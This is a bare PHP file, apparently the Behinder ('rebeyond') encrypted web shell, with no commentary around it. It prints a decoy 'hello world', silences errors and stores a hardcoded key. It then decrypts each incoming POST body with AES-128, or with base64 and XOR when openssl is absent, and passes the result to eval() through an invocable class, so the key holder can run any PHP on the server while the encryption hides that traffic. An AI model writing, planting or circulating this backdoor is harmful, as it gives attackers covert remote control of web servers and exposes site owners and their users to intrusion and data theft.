<?php
	
	@error_reporting(0);
	session_start();

	eval("echo 'hello world\n';");

    $key="e45e329feb5d925b"; //????????32?md5???16????????rebeyond
    $_SESSION['k']=$key;
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");

        for($i=0;$i<strlen($post);$i++) {
            $post[$i] = $post[$i]^$key[$i+1&15]; 
        }
    }
    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }

    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];

    class C
	{
		public function __invoke($p) 
		{
			eval($p."");
		}
	}

    @call_user_func(new C(),$params);
?>